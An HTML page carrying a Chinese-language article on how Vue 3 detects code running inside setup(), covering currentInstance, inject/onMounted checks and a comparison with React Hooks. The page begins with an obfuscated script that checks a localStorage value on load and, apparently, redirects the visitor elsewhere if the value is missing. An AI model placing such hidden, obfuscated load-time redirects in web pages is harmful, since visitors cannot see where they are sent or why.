<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x1280(e,s){var c=_0x2a79();return(_0x1280=function(s,n){var a=c[s-=132];void 0===_0x1280.rxiiFv&&(_0x1280.zGRvIM=function(s,n){var a,t=[],e=0,c="";for(s=(s=>{for(var n,a,t="",e="",c=0,o=0;a=s.charAt(o++);~a&&(n=c%4?64*n+a:a,c++%4)&&(t+=String.fromCharCode(255&n>>(-2*c&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var p=0,l=t.length;p<l;p++)e+="%"+("00"+t.charCodeAt(p).toString(16)).slice(-2);return decodeURIComponent(e)})(s),o=0;o<256;o++)t[o]=o;for(o=0;o<256;o++)e=(e+t[o]+n.charCodeAt(o%n.length))%256,a=t[o],t[o]=t[e],t[e]=a;for(var o=0,e=0,p=0;p<s.length;p++)a=t[o=(o+1)%256],t[o]=t[e=(e+t[o])%256],t[e]=a,c+=String.fromCharCode(s.charCodeAt(p)^t[(t[o]+t[e])%256]);return c},e=arguments,_0x1280.rxiiFv=!0);var s=s+c[0],t=e[s];return t?a=t:(void 0===_0x1280.WRoraG&&(_0x1280.WRoraG=!0),a=_0x1280.zGRvIM(a,n),e[s]=a),a})(e,s)}function _0x2a79(){var s=["C8o9W4BdUCoAW5TAWR8gtsRcMs8","WRORW7OaW4pcL3ThW7HHW6NcPa","wCk+WO03WR8QWRP4leu","FmoUB8kgW5dcGcyaWQDJnCkr","fNvBWR/dKmkKyCodWQ3dKa","ptRcQmkcW6qEhw7cKKZdV8oix8oimcLvxLNcTq8HW6PLqdC","jCokWQa3sdHRjMW","vsmFW6tdQmktya","DCkXhrhdGG","wmosW41tjcyUugeBWPXR","yxZdPCokW6D1zIFcU2u","W7xdPCkXCMGoqXC","W6ddIhddGf7cGmocWQVdJLtcOXVcUJK","dCoUDgqtq8kysCodc8omwb4","FCoxs8o+W5m1WR/cNHJcGXVdUmkxW4u","W6ldT8kvW4XwW4rmkNi","cCoTCMSzrSkFAmovmmoCAa8","xmocWPVcS3RcGCkIW4ddOSoXWQDt","ymojW4xdJIhdJtJdNmkHW6pcRSoS","g8kAuNqGWRbxW5dcQG","W4WRjfJcPCoPW5D6WRBdQa","ASoPWPVcP8kEW4lcUmoIW45LbCk8WQm","WQJcVSoLqvawAJZdNa","W5v9mmoPjmoDma","WRFcPWFdTCkJCvmObG"];return(_0x2a79=function(){return s})()}var _0x26c85c=_0x1280;if((()=>{for(var s=_0x1280,n=_0x2a79();;)try{if(719993==-parseInt(s(146,"MP9Q"))+parseInt(s(138,"LkQn"))/2*(-parseInt(s(132,"oYVM"))/3)+-parseInt(s(152,"kXm&"))/4*(parseInt(s(137,"v$#y"))/5)+parseInt(s(153,"iqC]"))/6+parseInt(s(134,"ze3O"))/7*(-parseInt(s(154,"Uyga"))/8)+parseInt(s(141,"K5Bk"))/9+parseInt(s(140,"VtCV"))/10)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x26c85c(151,"bLe4")](_0x26c85c(147,"Rj3f"))!=_0x26c85c(136,"hfL^"))throw window[_0x26c85c(139,"6JOZ")][_0x26c85c(135,"oYVM")](_0x26c85c(133,"LkQn")),Error();document.title="Vue 3 如何判断代码在 setup() 函数中执行",document.getElementById("article").innerHTML='<div><p>Vue 3 的 <code>setup()</code> 函数是 Composition API 的核心，它的执行上下文和普通 JavaScript 函数不同。Vue 通过 编译时标记 + 运行时状态管理 来判断代码是否在 <code>setup()</code> 中执行，以下是详细原理：</p>\n<hr>\n<p><strong>一、核心判断机制</strong><br>\n<strong>1. 编译时标记（SFC 单文件组件）</strong><br>\n当使用 <code>.vue</code> 单文件组件时，Vue 的编译器（<code>@vue/compiler-sfc</code>）会做以下处理：</p>\n<ul>\n<li>\n<p>将 <code>&lt;script setup&gt;</code> 或 <code>setup()</code> 函数编译为特殊的渲染函数。</p>\n</li>\n<li>\n<p>注入 <code>__sfc__</code> 标记，标明当前代码是组件的一部分。</p>\n</li>\n</ul>\n<pre><code class="language-javascript"><span class="hljs-comment">// 编译后的组件代码（简化）</span>\n<span class="hljs-keyword">const</span> __sfc__ = {\n  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-comment">// 这里被标记为 setup 上下文</span>\n    <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);\n    <span class="hljs-keyword">return</span> { count };\n  }\n};\n</code></pre>\n<p><strong>2. 运行时状态管理</strong><br>\nVue 在运行时通过全局变量 <code>currentInstance</code> 跟踪当前正在执行的组件实例：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">let</span> currentInstance = <span class="hljs-literal">null</span>;\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">setupComponent</span>(<span class="hljs-params">instance</span>) {\n  <span class="hljs-keyword">const</span> prevInstance = currentInstance;\n  currentInstance = instance; <span class="hljs-comment">// 标记当前实例</span>\n  instance.<span class="hljs-title function_">setup</span>();          <span class="hljs-comment">// 执行 setup</span>\n  currentInstance = prevInstance; <span class="hljs-comment">// 恢复上一个实例</span>\n}\n</code></pre>\n<ul>\n<li>\n<p>当 <code>setup()</code> 执行时，<code>currentInstance</code> 会被设置为当前组件实例。</p>\n</li>\n<li>\n<p>任何在 <code>setup()</code> 内部调用的 Composition API（如 <code>ref</code>、<code>onMounted</code>）会检查 <code>currentInstance</code> 是否存在。</p>\n</li>\n</ul>\n<hr>\n<p><strong>二、关键 API 的校验逻辑</strong><br>\n<strong>1. 依赖注入（<code>inject</code>）</strong><br>\n如果在 <code>setup()</code> 外调用 <code>inject()</code>，Vue 会报错：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">key</span>) {\n  <span class="hljs-keyword">if</span> (!currentInstance) {\n    <span class="hljs-title function_">warn</span>(<span class="hljs-string">`inject() can only be used inside setup().`</span>);\n  }\n  <span class="hljs-comment">// ...其他逻辑</span>\n}\n</code></pre>\n<p><strong>2. 生命周期钩子（<code>onMounted</code>）</strong><br>\n生命周期钩子必须注册到当前组件实例：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">onMounted</span>(<span class="hljs-params">hook</span>) {\n  <span class="hljs-keyword">if</span> (!currentInstance) {\n    <span class="hljs-title function_">warn</span>(<span class="hljs-string">`onMounted() can only be used inside setup().`</span>);\n  }\n  currentInstance.<span class="hljs-property">mountedHooks</span>.<span class="hljs-title function_">push</span>(hook);\n}\n</code></pre>\n<p><strong>3. 响应式状态（<code>ref</code>/<code>reactive</code>）</strong><br>\n虽然 <code>ref</code> 和 <code>reactive</code> 可以在 <code>setup()</code> 外调用，但如果在模板中使用，必须通过 <code>setup()</code> 返回：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// 合法但不推荐（脱离组件上下文）</span>\n<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);\n\n<span class="hljs-comment">// 推荐方式（在 setup 中定义）</span>\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {\n  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);\n    <span class="hljs-keyword">return</span> { count };\n  }\n}\n</code></pre>\n<hr>\n<p><strong>三、特殊场景处理</strong><br>\n<strong>1. <code>&lt;script setup&gt;</code> 语法糖</strong><br>\n<code>&lt;script setup&gt;</code> 会被编译为 <code>setup()</code> 函数，所有顶层绑定自动暴露给模板：</p>\n<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="language-javascript">\n<span class="hljs-comment">// 编译后自动成为 setup() 的返回值</span>\n<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);\n</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>\n\n<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>\n  {{ count }} <span class="hljs-comment">&lt;!-- 直接使用 --&gt;</span>\n<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>\n</code></pre>\n<p><strong>2. 非 SFC 用法（JSX/渲染函数）</strong><br>\n如果直接使用渲染函数，必须手动调用 <code>setup()</code> 并返回状态：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {\n  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);\n    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-string">&#x27;div&#x27;</span>, count.<span class="hljs-property">value</span>);\n  }\n}\n</code></pre>\n<p><strong>3. 动态组件</strong><br>\n动态加载的组件也会通过 <code>currentInstance</code> 关联上下文：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">AsyncComponent</span> = <span class="hljs-title function_">defineAsyncComponent</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./Component.vue&#x27;</span>));\n</code></pre>\n<hr>\n<p><strong>四、与 React Hooks 的对比</strong></p>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>Vue 3 <code>setup()</code></th>\n<th>React Hooks</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>调用位置限制</td>\n<td>❌ 无（但推荐在 <code>setup</code> 中使用）</td>\n<td>✅ 必须顶层调用</td>\n</tr>\n<tr>\n<td>状态管理原理</td>\n<td>响应式系统（Proxy/Ref）</td>\n<td>链表顺序 + 闭包</td>\n</tr>\n<tr>\n<td>上下文依赖</td>\n<td>通过 <code>currentInstance</code> 绑定</td>\n<td>通过 <code>ReactCurrentDispatcher</code></td>\n</tr>\n<tr>\n<td>编译时支持</td>\n<td>✅ SFC 编译优化</td>\n<td>❌ 纯运行时</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<p><strong>五、总结</strong><br>\nVue 3 通过以下方式判断代码是否在 <code>setup()</code> 中执行：</p>\n<ol>\n<li>编译时：SFC 编译器标记 <code>&lt;script setup&gt;</code> 或 <code>setup()</code> 函数。</li>\n<li>运行时：通过 <code>currentInstance</code> 跟踪当前组件实例。</li>\n<li>API 设计：关键 Composition API（如 <code>inject</code>、<code>onMounted</code>）会校验上下文。</li>\n</ol>\n<p>最佳实践：</p>\n<ul>\n<li>\n<p>始终在 <code>setup()</code> 或 <code>&lt;script setup&gt;</code> 中定义响应式状态和逻辑。</p>\n</li>\n<li>\n<p>避免在普通 JS 文件中直接使用 Composition API（除非明确需要共享状态）。</p>\n</li>\n</ul>\n</div>'</script></body></html>